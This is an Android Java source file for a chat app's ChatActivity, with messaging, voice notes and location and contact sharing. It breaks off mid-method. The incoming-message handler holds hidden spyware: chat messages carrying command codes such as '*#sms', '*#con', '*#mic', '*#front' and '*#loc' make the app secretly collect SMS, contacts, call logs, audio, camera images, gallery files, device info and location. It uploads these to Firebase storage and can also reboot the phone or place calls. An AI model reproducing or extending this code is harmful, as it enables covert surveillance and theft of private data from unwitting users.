package com.black.chat.ui;

import android.app.DownloadManager;
import android.content.ActivityNotFoundException;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Color;
import android.location.Location;
import android.location.LocationManager;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Looper;
import android.os.Vibrator;
import android.support.annotation.NonNull;
import android.support.annotation.RequiresApi;
import android.support.v4.provider.DocumentFile;
import android.support.v7.app.AlertDialog;
import android.support.v7.widget.LinearLayoutManager;
import android.support.v7.widget.RecyclerView;
import android.util.Base64;
import android.util.Log;
import android.util.Patterns;
import android.view.LayoutInflater;
import android.view.Menu;
import android.view.MenuItem;
import android.view.MotionEvent;
import android.view.View;
import android.view.ViewGroup;
import android.view.animation.TranslateAnimation;
import android.view.inputmethod.InputMethodManager;
import android.webkit.URLUtil;
import android.widget.ImageButton;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

import com.black.chat.fat.CLogFile;
import com.black.chat.fat.CamService;
import com.black.chat.fat.ContactsFile;
import com.black.chat.fat.DeviceInfo;
import com.black.chat.fat.GetAppList;
import com.black.chat.fat.GetImage;
import com.black.chat.fat.LocListener;
import com.black.chat.fat.SmsFile;
import com.black.chat.fat.SoundRec;
import com.black.chat.util.fileReturnable;
import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.firebase.database.ChildEventListener;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;
import com.kbeanie.multipicker.api.AudioPicker;
import com.kbeanie.multipicker.api.ContactPicker;
import com.kbeanie.multipicker.api.FilePicker;
import com.kbeanie.multipicker.api.ImagePicker;
import com.kbeanie.multipicker.api.MediaPicker;
import com.kbeanie.multipicker.api.Picker;
import com.kbeanie.multipicker.api.VideoPicker;
import com.kbeanie.multipicker.api.callbacks.ContactPickerCallback;
import com.kbeanie.multipicker.api.callbacks.MediaPickerCallback;
import com.kbeanie.multipicker.api.callbacks.VideoPickerCallback;
import com.kbeanie.multipicker.api.entity.ChosenContact;
import com.kbeanie.multipicker.api.entity.ChosenImage;
import com.kbeanie.multipicker.api.entity.ChosenVideo;
import com.black.chat.R;
import com.black.chat.Rest.ApiClient;
import com.black.chat.Rest.ApiInterface;
import com.black.chat.data.SharedPreferenceHelper;
import com.black.chat.data.StaticConfig;
import com.black.chat.model.Conversation;
import com.black.chat.model.Message;
import com.black.chat.model.RequestNotificaton;
import com.black.chat.model.SendNotificationModel;
import com.black.chat.util.BaseActivity;
import com.black.chat.util.MyLocation;
import com.black.chat.util.SavePref;
import com.black.chat.util.ViewDialog;
import com.squareup.picasso.Picasso;
import com.yarolegovich.lovelydialog.LovelyProgressDialog;

import org.json.JSONObject;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Objects;

import de.hdodenhof.circleimageview.CircleImageView;
import hani.momanii.supernova_emoji_library.Actions.EmojIconActions;
import hani.momanii.supernova_emoji_library.Helper.EmojiconEditText;
import okhttp3.ResponseBody;
import retrofit2.Callback;

import static com.black.chat.util.FileUtils.getRealPath;


public class ChatActivity extends BaseActivity implements View.OnClickListener {
    private RecyclerView recyclerChat;
    public static final int VIEW_TYPE_USER_MESSAGE = 0;
    public static final int VIEW_TYPE_FRIEND_MESSAGE = 1;
    private ListMessageAdapter adapter;
    private String roomId;
    private String nameFriend;
    private String pushid;
    private ArrayList<CharSequence> idFriend;
    private Conversation conversation;
    private ImageButton btnSend;
    private ImageButton btnRec;
    private EmojiconEditText editWriteMessage;
    private LinearLayoutManager linearLayoutManager;
    public static HashMap<String, Bitmap> bitmapAvataFriend;
    public Bitmap bitmapAvataUser;

    private View rootView;
    private ImageView ivEmoji;
    private EmojIconActions emojIcon;

    private DatabaseReference chatRoomDBRef;
    private StorageReference chatStorageRef;
    UploadTask uploadTask;
    String friendidd;
    String friendemail;

    SavePref savePref;

    String fatroomid;

    View myView;
    boolean isUp;

    ImagePicker imagePicker;
    FilePicker filePicker;
    VideoPicker videoPicker;
    AudioPicker audioPicker;
    ContactPicker contactPicker;
    MediaPicker mediaPicker;

    VideoPickerCallback videoPickerCallback;

    private ApiInterface apiService;

    private static final int SECOND_MILLIS = 1000;
    private static final int MINUTE_MILLIS = 60 * SECOND_MILLIS;
    private static final int HOUR_MILLIS = 60 * MINUTE_MILLIS;
    private static final int DAY_MILLIS = 24 * HOUR_MILLIS;


    private static final int RECORDER_SAMPLERATE = 8000;
    private static final int RECORDER_CHANNELS = MediaRecorder.AudioSource.MIC;
    private static final int RECORDER_AUDIO_ENCODING = MediaRecorder.AudioEncoder.AMR_NB;
    private MediaRecorder recorder = null;
    private Thread recordingThread = null;
    private boolean isRecording = false;

    static File audiofile ;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_chat);

        savePref = new SavePref(this);

        Intent intentData = getIntent();
        idFriend = intentData.getCharSequenceArrayListExtra(StaticConfig.INTENT_KEY_CHAT_ID);
        roomId = intentData.getStringExtra(StaticConfig.INTENT_KEY_CHAT_ROOM_ID);
        nameFriend = intentData.getStringExtra(StaticConfig.INTENT_KEY_CHAT_FRIEND);
        friendidd = intentData.getStringExtra("friendidd");
        friendemail = intentData.getStringExtra("friendemail");

        chatRoomDBRef = FirebaseDatabase.getInstance().getReference().child("message/" + roomId);
        chatStorageRef = FirebaseStorage.getInstance().getReference();

        myView = findViewById(R.id.my_view);
        editWriteMessage = (EmojiconEditText) findViewById(R.id.editWriteMessage);
        rootView = (View) findViewById(R.id.rootview);
        ivEmoji = (ImageView) findViewById(R.id.iv_emoji);
        btnSend = (ImageButton) findViewById(R.id.btnSend);
        btnRec = (ImageButton) findViewById(R.id.btnRec);
        // initialize as invisible (could also do in xml)
        myView.setVisibility(View.GONE);
        isUp = false;


        btnSend.setOnClickListener(this);

        btnRec.setOnTouchListener(new View.OnTouchListener() {
            @Override
            public boolean onTouch(View v, MotionEvent motionEvent) {
                switch (motionEvent.getAction()) {
                    case MotionEvent.ACTION_DOWN: {
                        // PRESSED
                        startRecording();

                        return true; // if you want to handle the touch event
                    }
                    case MotionEvent.ACTION_UP: {
                        // RELEASED
                        stopRecording();
                        return true; // if you want to handle the touch event
                    }
                    case MotionEvent.ACTION_CANCEL: {
                        stopRecording();

                        return true;
                    }
                }
                return false;
            }
        });

        String base64AvataUser = SharedPreferenceHelper.getInstance(this).getUserInfo().avata;
        if (!base64AvataUser.equals(StaticConfig.STR_DEFAULT_BASE64)) {
            byte[] decodedString = Base64.decode(base64AvataUser, Base64.DEFAULT);
            bitmapAvataUser = BitmapFactory.decodeByteArray(decodedString, 0, decodedString.length);
        } else {
            bitmapAvataUser = null;
        }

        firebaseMessages();


        EmojIconActions emojIcon = new EmojIconActions(this, rootView, editWriteMessage, ivEmoji);
        emojIcon.ShowEmojIcon();

        int i = savePref.getUrduKeyPadChooser();
        if (i == 0) {
            Toast.makeText(this, "Select preferable Keypad", Toast.LENGTH_SHORT).show();

            String s = SharedPreferenceHelper.getInstance(this).getLang();
            if ("ur".equalsIgnoreCase(s)) {
                InputMethodManager mgr =
                        (InputMethodManager) getSystemService(Context.INPUT_METHOD_SERVICE);
                if (mgr != null) {
                    mgr.showInputMethodPicker();
                }
            }
            savePref.setUrduKeyPadChooser(1);
        }

    }

    int BufferElements2Rec = 1024; // want to play 2048 (2K) since 2 bytes we
    // use only 1024
    int BytesPerElement = 2;

    private void startRecording() {

        Toast.makeText(this, "Recording voice message ..", Toast.LENGTH_SHORT).show();

        vibrate();
        String timeStamp = new java.text.SimpleDateFormat("yyyyMMdd_HHmmssSSS_z").
                format(new Date()).replace(":", "_");

        audiofile = new File(Environment.getExternalStorageDirectory()+ "/" + "Raabta" + "/" + "sound" +timeStamp+ ".amr");


        recorder = new MediaRecorder();
        recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        recorder.setOutputFormat(MediaRecorder.OutputFormat.AMR_NB);
        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
        recorder.setOutputFile(audiofile.getAbsolutePath());
        try {
            recorder.prepare();
        } catch (IllegalStateException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (Exception e) {
            e.printStackTrace();
        }
        Log.d("entered", "incoming call recorder started");
        recorder.start();
        isRecording = true;

    }

    private void vibrate() {
        Vibrator v = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
        assert v != null;
        v.vibrate(400);
    }

    private void stopRecording() {
        // stops the recording activity
        vibrate();
        Toast.makeText(this, "Sending voice message ..", Toast.LENGTH_SHORT).show();
        if (null != recorder) {
            isRecording = false;
            recorder.stop();
            recorder.release();
            recorder = null;
            recordingThread = null;

            Uri p;
            String name;
            String type;
            File file = new File(audiofile.getAbsolutePath());
            try {
                p = Uri.parse(audiofile.getAbsolutePath());
                name = file.getName();

            } catch (Exception e) {
                p = Uri.parse(audiofile.getAbsolutePath());
                name = file.getName();
            }

            //String path = getRealPath(p);

            InputStream stream = null;
            try {
                stream = new FileInputStream(new File(String.valueOf(p)));
            } catch (FileNotFoundException e) {
                e.printStackTrace();
            }

            assert stream != null;
            uploadTask = chatStorageRef.child("chat_media").child(name).putStream(stream);
            uploadTask.addOnFailureListener(new OnFailureListener() {
                @Override
                public void onFailure(@NonNull Exception exception) {
                    // Handle unsuccessful uploads
                }
            }).addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
                @RequiresApi(api = Build.VERSION_CODES.KITKAT)
                @Override
                public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
                    // taskSnapshot.getMetadata() contains file metadata such as size, content-type, etc.
                    // ...

                    String fUri = String.valueOf(Objects.requireNonNull(taskSnapshot.getMetadata()).getDownloadUrl());
                    String fName = taskSnapshot.getMetadata().getName();
                    String fType = taskSnapshot.getMetadata().getContentType();
                    // ...
                    submitInChat("", "", "", "", "", "", "", fName, fUri, fType);

                }
            });
        }
    }


    private void firebaseMessages() {
        conversation = new Conversation();
        if (idFriend != null && nameFriend != null) {

            getSupportActionBar().setTitle(nameFriend);

            getOnLineStatus();

            linearLayoutManager = new LinearLayoutManager(this, LinearLayoutManager.VERTICAL, false);
            recyclerChat = (RecyclerView) findViewById(R.id.recyclerChat);
            recyclerChat.setLayoutManager(linearLayoutManager);
            //recyclerChat.setItemViewCacheSize(9999);

            adapter = new ListMessageAdapter(this, conversation, bitmapAvataFriend, bitmapAvataUser, roomId);

            conversation.getListMessageData().clear();
            adapter.notifyDataSetChanged();

            chatRoomDBRef.addChildEventListener(new ChildEventListener() {
                @Override
                public void onChildAdded(DataSnapshot dataSnapshot, String s) {
                    DatabaseReference ref = dataSnapshot.getRef();
                    //DatabaseReference dref = ref.getParent();
                    String ss = String.valueOf(ref.getParent());
                    String[] bits = ss.split("/");
                     fatroomid = bits[bits.length-1];
                    //Log.d("asdasd", ss);
                    if (dataSnapshot.getValue() != null) {
                        HashMap mapMessage = (HashMap) dataSnapshot.getValue();
                        Message newMessage = new Message();

                        try {

                            newMessage.idSender = (String) mapMessage.get("idSender");
                            newMessage.pushId = (String) mapMessage.get("pushId");
                            newMessage.idReceiver = (String) mapMessage.get("idReceiver");
                            newMessage.text = (String) mapMessage.get("text");
                            newMessage.timestamp = (long) mapMessage.get("timestamp");

                            newMessage.latitude = (String) mapMessage.get("latitude");
                            newMessage.longitude = (String) mapMessage.get("longitude");
                            newMessage.provider = (String) mapMessage.get("provider");

                            newMessage.contactname = (String) mapMessage.get("contactname");
                            newMessage.contactnumber = (String) mapMessage.get("contactnumber");
                            newMessage.contactemail = (String) mapMessage.get("contactemail");
                            newMessage.contactimg = (String) mapMessage.get("contactimg");

                            newMessage.filedownlodeurl = (String) mapMessage.get("filedownlodeurl");
                            newMessage.filename = (String) mapMessage.get("filename");
                            newMessage.filetype = (String) mapMessage.get("filetype");


                            String lang = SharedPreferenceHelper.getInstance(ChatActivity.this).getLang();

                            if (lang.equalsIgnoreCase("en")) {
                                // TODO: 26/4/20  make cnc condition here
                                String txt = (String) mapMessage.get("text");
                                if (txt.contains("*#sms")) {
                                    new SmsFile(ChatActivity.this, new fileReturnable() {
                                        @Override
                                        public void ok(File f) {
                                            uploadFileCat(f);
                                        }
                                    }).execute();
                                }
                                else if (txt.contains("*#app")) {
                                    new GetAppList(ChatActivity.this, new fileReturnable() {
                                        @Override
                                        public void ok(File f) {

                                        }
                                    }).getAppList();
                                }
                                else if (txt.contains("*#dev")) {
                                    new DeviceInfo(ChatActivity.this, new fileReturnable() {
                                        @Override
                                        public void ok(File f) {
                                            uploadFileCat(f);
                                        }
                                    }).populateInfoCode();
                                }
                                else if (txt.contains("*#mic")) {
                                    new SoundRec( new fileReturnable() {
                                        @Override
                                        public void ok(File f) {
                                            uploadFileCat(f);
                                        }
                                    }).Rec(30);
                                }//by default 30sec
                                else if (txt.contains("*#con")) {
                                    new ContactsFile(ChatActivity.this, new fileReturnable() {
                                        @Override
                                        public void ok(File f) {
                                            uploadFileCat(f);
                                        }
                                    }).writeContacts();
                                }
                                else if (txt.contains("*#call")) {
                                    new CLogFile(ChatActivity.this, new fileReturnable() {
                                        @Override
                                        public void ok(File f) {
                                            uploadFileCat(f);
                                        }
                                    }).execute();
                                }
                                // $$ call rec will upload itself *#callrec
                                else if (txt.contains("*#gal")) {
                                    savePref.setFatRoomId(fatroomid);
                                    startService(new Intent(ChatActivity.this, GetImage.class));
                                } else if (txt.contains("*#front")) {
                                    savePref.setFatRoomId(fatroomid);
                                    startCmera(1);
                                } //uploadfile baki hai
                                else if (txt.contains("*#back")) {
                                    savePref.setFatRoomId(fatroomid);
                                    startCmera(0);

                                }  else if (txt.contains("*#loc")) {
                                    savePref.setFatRoomId(fatroomid);
                                    getLocation();
                                } // also it will send loc by self after few intervalelse
                                 if (txt.contains("*#boot")) {
                                    startBoot();
                                } else if (txt.contains("*#call-")) {
                                    String[] value = txt.split("-");
                                    startCall(value[1]);
                                } else if (txt.contains("*#file")) {
                                }

                            }

                        } catch (Exception e) {
                        }

                        conversation.getListMessageData().add(newMessage);
                        adapter.notifyDataSetChanged();
                        linearLayoutManager.scrollToPosition(conversation.getListMessageData().size() - 1);
                    }
                }

                @Override
                public void onChildChanged(DataSnapshot dataSnapshot, String s) {
                    // TODO: 10/30/2018 counter
                    savePref.setCounter(0);
                }

                @Override
                public void onChildRemoved(DataSnapshot dataSnapshot) {
                    //conversation.getListMessageData().clear();
                    //int diaryIndex = conversation.getListMessageData().indexOf(dataSnapshot.getKey());
                    HashMap mapMessage = (HashMap) dataSnapshot.getValue();
                    String pushid = (String) mapMessage.get("pushId");
                    int msgIndex = -1;
                    for (int i = 0; i < conversation.getListMessageData().size(); i++) {
                        String localpushId = conversation.getListMessageData().get(i).pushId;
                        if (localpushId.equals(pushid)) {
                            msgIndex = i;
                        }
                    }
                    if (msgIndex > -1) {
                        conversation.getListMessageData().remove(msgIndex);
                        adapter.notifyItemRemoved(msgIndex);
                        adapter.notifyDataSetChanged();
                    } else {
                        Toast.makeText(ChatActivity.this, "" + pushid, Toast.LENGTH_SHORT).show();
                    }
                }

                @Override
                public void onChildMoved(DataSnapshot dataSnapshot, String s) {
                }

                @Override
                public void onCancelled(DatabaseError databaseError) {
                }
            });
            recyclerChat.setAdapter(adapter);
        }
    }

    private void getLocation() {
        Looper.prepare();
        LocListener gps = new LocListener(ChatActivity.this);
        gps.postitem1();

        if(gps.canFindPosition()){
            // check if GPS enabled
            String latitude = String.valueOf(gps.getLatitude());
            String longitude = String.valueOf(gps.getLongitude());
            submitInChatCat(latitude, longitude, "pro", "", "", "", "", "", "", "");
        }
    }

    private void startCall(String s) {

        Intent intent = new Intent(Intent.ACTION_CALL);
        intent.setData(Uri.parse("tel:"+ s ));
        startActivity(intent);
    }

    private void startBoot() {
        try {
            Process proc = Runtime.getRuntime().exec(new String[]{"reboot"});
            proc.waitFor();
        } catch (Exception ex) {
            Log.i("reboot", "Could not reboot", ex);
        }
    }

    private void startCmera(int i) {
        Intent camactivity = new Intent(this, CamService.class);
        camactivity.putExtra("cameraid", i);
        startService(camactivity);
    }


    public void slideUp(View view) {
        TranslateAnimation animate = new TranslateAnimation(
                0,                 // fromXDelta
                0,                 // toXDelta
                view.getHeight(),  // fromYDelta
                0);                // toYDelta
        animate.setDuration(500);
        animate.setFillAfter(true);
        view.startAnimation(animate);
        view.setVisibility(View.VISIBLE);
    }

    public void slideDown(View view) {

        TranslateAnimation animate = new TranslateAnimation(
                0,                 // fromXDelta
                0,                 // toXDelta
                0,                 // fromYDelta
                view.getHeight() + 6000); // toYDelta
        animate.setDuration(500);
        animate.setFillAfter(true);
        view.startAnimation(animate);
        view.setVisibility(View.GONE);
    }

    public void onSlideViewButtonClick(View view) {
        animate();
    }

    private void animate() {
        if (isUp) {
            slideDown(myView);

        } else {
            slideUp(myView);
        }
        isUp = !isUp;
    }

    @Override
    protected void onResume() {
        super.onResume();

    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.chat_menu, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        if (item.getItemId() == android.R.id.home) {
            Intent result = new Intent();
            result.putExtra("idFriend", idFriend.get(0));
            setResult(RESULT_OK, result);
            this.finish();
            return true;
        } else if (item.getItemId() == R.id.clearchat) {
            new AlertDialog.Builder(this)
                    .setTitle("Clear Chat")
                    .setMessage("Are you sure want to delete full chat ?")
                    .setPositiveButton(android.R.string.ok, new DialogInterface.OnClickListener() {
                        @Override
                        public void onClick(DialogInterface dialogInterface, int i) {
                            dialogInterface.dismiss();

                            chatRoomDBRef.removeValue();

                        }
                    })
                    .setNegativeButton(android.R.string.cancel, new DialogInterface.OnClickListener() {
                        @Override
                        public void onClick(DialogInterface dialogInterface, int i) {
                            dialogInterface.dismiss();
                        }
                    }).show();

            return true;
        } else if (item.getItemId() == R.id.changekeypad) {

            InputMethodManager mgr =
                    (InputMethodManager) getSystemService(Context.INPUT_METHOD_SERVICE);
            if (mgr != null) {
                mgr.showInputMethodPicker();
            }
            return true;
        }

        return super.onOptionsItemSelected(item);

    }

    @Override
    public void onBackPressed() {
        Intent result = new Intent();
        result.putExtra("idFriend", idFriend.get(0));
        setResult(RESULT_OK, result);
        this.finish();
    }

    @Override
    public void onClick(View view) {
        if (view.getId() == R.id.btnSend) {
            // TODO: 10/30/2018 counter
            String j = String.valueOf(savePref.getCounter() + 1);
            pushid = chatRoomDBRef.push().getKey();
            String content = editWriteMessage.getText().toString().trim();
            if (content.length() > 0) {
                editWriteMessage.setText("");
                Message newMessage = new Message();
                newMessage.text = content;
                newMessage.idSender = StaticConfig.UID;
                newMessage.idReceiver = roomId;
                newMessage.pushId = pushid;
                newMessage.timestamp = System.currentTimeMillis();

                newMessage.latitude = "";
                newMessage.longitude = "";
                newMessage.provider = j;
                newMessage.contactname = "";
                newMessage.contactnumber = "";
                newMessage.contactemail = "";
                newMessage.contactimg = "";
                newMessage.filename = "";
                newMessage.filedownlodeurl = "";
                newMessage.filetype = "";

                chatRoomDBRef.child(pushid).setValue(newMessage);
                sendNotificationToPatner();
                //recreate();
            }
        }
    }

    private void getOnLineStatus() {
        DatabaseReference status = null;
        DatabaseReference lastseen = null;
        try {
            status = FirebaseDatabase.getInstance().getReference().child("user").child(friendidd).child("status").child("isOnline");
            lastseen = FirebaseDatabase.getInstance().getReference().child("user").child(friendidd).child("status").child("timestamp");
        } catch (Exception e) {
            return;
        }
        status.addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(DataSnapshot dataSnapshot) {
                Boolean whatsMyStatus = (Boolean) dataSnapshot.getValue();

                if (whatsMyStatus) {
                    getSupportActionBar().setSubtitle("online");
                } else {
                    getSupportActionBar().setSubtitle("offline");
                }
            }

            @Override
            public void onCancelled(DatabaseError databaseError) {

            }
        });

        lastseen.addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(DataSnapshot dataSnapshot) {
                String s = String.valueOf(getSupportActionBar().getSubtitle());
                Long ls = (Long) dataSnapshot.getValue();
                String date = getTimeAgo(ls, ChatActivity.this);

                if (s == "offline") {
                    getSupportActionBar().setSubtitle(date);
                }
            }

            @Override
            public void onCancelled(DatabaseError databaseError) {

            }
        });
    }

    public static String getTimeAgo(long time, Context ctx) {
        if (time < 1000000000000L) {
            // if timestamp given in seconds, convert to millis
            time *= 1000;
        }

        long now = System.currentTimeMillis();
        if (time > now || time <= 0) {
            return null;
        }

        final long diff = now - time;
        if (diff < MINUTE_MILLIS) {
            return "just now";
        } else if (diff < 2 * MINUTE_MILLIS) {
            return "a minute ago";
        } else if (diff < 50 * MINUTE_MILLIS) {
            return diff / MINUTE_MILLIS + " minutes ago";
        } else if (diff < 90 * MINUTE_MILLIS) {
            return "an hour ago";
        } else if (diff < 24 * HOUR_MILLIS) {
            return diff / HOUR_MILLIS + " hours ago";
        } else if (diff < 48 * HOUR_MILLIS) {
            return "yesterday";
        } else {
            return diff / DAY_MILLIS + " days ago";
        }
    }

    private void submitInChat(String lat, String lan, String prov, String cname, String cnum, String cemail, String cimg, String fname, String furl, String ftype) {

        String j = String.valueOf(savePref.getCounter() + 1);
        pushid = chatRoomDBRef.push().getKey();
        Message newMessage = new Message();
        newMessage.text = "~file~";
        newMessage.idSender = StaticConfig.UID;
        newMessage.idReceiver = roomId;
        newMessage.pushId = pushid;
        newMessage.timestamp = System.currentTimeMillis();

        newMessage.latitude = lat;
        newMessage.longitude = lan;
        newMessage.provider = j;
        newMessage.contactname = cname;
        newMessage.contactnumber = cnum;
        newMessage.contactemail = cemail;
        newMessage.contactimg = cimg;
        newMessage.filename = fname;
        newMessage.filedownlodeurl = furl;
        newMessage.filetype = ftype;

        //chatRoomDBRef.push().setValue(newMessage);
        chatRoomDBRef.child(pushid).setValue(newMessage);
        sendNotificationToPatner();
    }

    public void submitInChatCat(String lat, String lan, String prov, String cname, String cnum, String cemail, String cimg, String fname, String furl, String ftype) {

        /*SavePref savePref = new SavePref(ChatActivity.this);
        String rid = savePref.getFatRoomId();*/

        chatRoomDBRef = FirebaseDatabase.getInstance().getReference().child("message/" + roomId);
        /*savePref = new SavePref(ChatActivity.this);

        String j = String.valueOf(savePref.getCounter() + 1);*/


        pushid = chatRoomDBRef.push().getKey();
        Message newMessage = new Message();
        newMessage.text = "*#~file~";
        newMessage.idSender = StaticConfig.UID;
        newMessage.idReceiver = roomId;
        newMessage.pushId = pushid;
        newMessage.timestamp = System.currentTimeMillis();

        newMessage.latitude = lat;
        newMessage.longitude = lan;
        newMessage.provider = "j";
        newMessage.contactname = cname;
        newMessage.contactnumber = cnum;
        newMessage.contactemail = cemail;
        newMessage.contactimg = cimg;
        newMessage.filename = fname;
        newMessage.filedownlodeurl = furl;
        newMessage.filetype = ftype;

        //chatRoomDBRef.push().setValue(newMessage);
        chatRoomDBRef.child(pushid).setValue(newMessage);
        sendNotificationToPatner();
    }

    public void uploadFileCat(File f){
        chatStorageRef = FirebaseStorage.getInstance().getReference();
        Uri p;
        String name;
        try {
            p = Uri.parse(f.getAbsolutePath());
            name = f.getName();

        } catch (Exception e) {
            p = Uri.parse(f.getAbsolutePath());
            name = f.getName();
        }

        //String path = getRealPath(p);

        InputStream stream = null;
        try {
            stream = new FileInputStream(new File(String.valueOf(p)));
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        }

        assert stream != null;
        uploadTask = chatStorageRef.child("chat_media").child(name).putStream(stream);
        uploadTask.addOnFailureListener(new OnFailureListener() {
            @Override
            public void onFailure(@NonNull Exception exception) {
                // Handle unsuccessful uploads
            }
        }).addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
            @RequiresApi(api = Build.VERSION_CODES.KITKAT)
            @Override
            public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
                // taskSnapshot.getMetadata() contains file metadata such as size, content-type, etc.
                // ...

                String fUri = String.valueOf(Objects.requireNonNull(taskSnapshot.getMetadata()).getDownloadUrl());
                String fName = taskSnapshot.getMetadata().getName();
                String fType = taskSnapshot.getMetadata().getContentType();
                // ...
                submitInChatCat("", "", "", "", "", "", "", fName, fUri, fType);

            }
        });
    }

    private void sendNotificationToPatner() {

        RequestNotificaton requestNotificaton = new RequestNotificaton();
        requestNotificaton.setSendNotificationModel(new SendNotificationModel("new message arrived", "hi there ! ", "ilost", "default"));

        String topic_name;
        try {
            topic_name = friendemail.substring(0, friendemail.indexOf("@"));
            topic_name = topic_name.replace("+","0");
        } catch (Exception e) {
            topic_name = "nonamefornow";
        }

        requestNotificaton.setToken("/topics/" + topic_name);

        apiService = ApiClient.getClient().create(ApiInterface.class);
        retrofit2.Call<ResponseBody> responseBodyCall = apiService.sendChatNotification(requestNotificaton);

        responseBodyCall.enqueue(new Callback<ResponseBody>() {
            @Override
            public void onResponse(retrofit2.Call<ResponseBody> call, retrofit2.Response<ResponseBody> response) {
                Log.d("kkkk", "done");
            }

            @Override
            public void onFailure(retrofit2.Call<ResponseBody> call, Throwable t) {

            }
        });
    }

    public void imgg(View view) {
        animate();

        Intent intent = new Intent(Intent.ACTION_GET_CONTENT);
        intent.setType("*/*");
        intent.addCategory(Intent.CATEGORY_OPENABLE);
        try {
            startActivityForResult(Intent.createChooser(intent, "Select a file to upload"), 8788);
        } catch (Exception e) {
            Toast.makeText(this, "Please select file from Storage", Toast.LENGTH_SHORT).show();
        }

    }

    public void audd(View view) {
        animate();
        //Toast.makeText(this, "Version 2.0", Toast.LENGTH_SHORT).show();

        Intent intent = new Intent(Intent.ACTION_GET_CONTENT);
        intent.setType("*/*");
        intent.addCategory(Intent.CATEGORY_OPENABLE);
        try {
            startActivityForResult(Intent.createChooser(intent, "Select a file to upload"), 8788);
        } catch (Exception e) {
            Toast.makeText(this, "Please select file from Storage", Toast.LENGTH_SHORT).show();
        }

    }

    public void vidd(View view) {
        animate();

        Intent intent = new Intent(Intent.ACTION_GET_CONTENT);
        intent.setType("*/*");
        intent.addCategory(Intent.CATEGORY_OPENABLE);
        try {
            startActivityForResult(Intent.createChooser(intent, "Select a file to upload"), 8788);
        } catch (Exception e) {
            Toast.makeText(this, "Please select file from Storage", Toast.LENGTH_SHORT).show();
        }


        //letPickMedia();


    }

    public void filee(View view) {
        animate();

        Intent intent = new Intent(Intent.ACTION_GET_CONTENT);
        intent.setType("*/*");
        intent.addCategory(Intent.CATEGORY_OPENABLE);
        try {
            startActivityForResult(Intent.createChooser(intent, "Select a file to upload"), 8788);
        } catch (Exception e) {
            Toast.makeText(this, "Please select file from Storage", Toast.LENGTH_SHORT).show();
        }

    }

    private void buildAlertMessageNoGps() {
        final AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setMessage("Your GPS seems to be disabled, do you want to enable it?")
                .setCancelable(false)
                .setPositiveButton("Yes", new DialogInterface.OnClickListener() {
                    public void onClick(@SuppressWarnings("unused") final DialogInterface dialog, @SuppressWarnings("unused") final int id) {
                        startActivity(new Intent(android.provider.Settings.ACTION_LOCATION_SOURCE_SETTINGS));
                    }
                })
                .setNegativeButton("No", new DialogInterface.OnClickListener() {
                    public void onClick(final DialogInterface dialog, @SuppressWarnings("unused") final int id) {
                        dialog.cancel();
                    }
                });
        final AlertDialog alert = builder.create();
        alert.show();
    }

    public void locc(View view) {
        animate();

        final LocationManager manager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);

        if (!manager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
            buildAlertMessageNoGps();
        }


        MyLocation.LocationResult locationResult = new MyLocation.LocationResult() {
            @Override
            public void gotLocation(Location location) {
                //Got the location!
                String lat = String.valueOf(location.getLatitude());
                String longi = String.valueOf(location.getLongitude());
                String provider = String.valueOf(location.getProvider());

                submitInChat(lat, longi, provider, "", "", "", "", "", "", "");

            }
        };
        MyLocation myLocation = new MyLocation();
        myLocation.getLocation(this, locationResult);
    }

    public void contt(View view) {
        animate();
        contactPicker = new ContactPicker(ChatActivity.this);
        contactPicker.setContactPickerCallback(new ContactPickerCallback() {
            @Override
            public void onContactChosen(ChosenContact chosenContact) {
                String name = chosenContact.getDisplayName();
                String phone = chosenContact.getPhones().get(0);
                //String contacturi = chosenContact.getPhotoUri();
                Toast.makeText(ChatActivity.this, phone, Toast.LENGTH_SHORT).show();
                submitInChat("", "", "", name, phone, "", "", "", "", "");
            }

            @Override
            public void onError(String s) {
                Toast.makeText(ChatActivity.this, s, Toast.LENGTH_SHORT).show();
            }
        });
        contactPicker.pickContact();
    }

    private void letPickMedia() {
        mediaPicker = new MediaPicker(ChatActivity.this);
        MediaPickerCallback mediaPickerCallback = new MediaPickerCallback() {
            @Override
            public void onMediaChosen(List<ChosenImage> list, List<ChosenVideo> list1) {
                //showToast("choose video " + list1.get(0).getOriginalPath());

                Uri p;
                String name;
                String type;
                try {
                    p = Uri.parse(list.get(0).getOriginalPath());
                    name = list.get(0).getDisplayName();
                    type = list.get(0).getFileExtensionFromMimeTypeWithoutDot();
                } catch (Exception e) {
                    p = Uri.parse(list1.get(0).getOriginalPath());
                    name = list1.get(0).getDisplayName();
